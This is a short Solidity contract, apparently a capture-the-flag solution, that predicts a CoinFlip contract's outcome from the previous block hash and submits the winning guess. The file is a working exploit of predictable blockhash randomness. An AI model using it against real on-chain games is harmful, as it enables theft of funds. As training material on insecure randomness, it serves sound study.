pragma solidity ^0.4.24;

contract CoinFlip {
      function flip(bool _guess) public returns (bool);
}

contract WinCoinFlip {
    CoinFlip flip_contract_;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip contractAddress) public {
        flip_contract_ = contractAddress;
    }
    
    function flip() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        flip_contract_.flip(side);
    }
}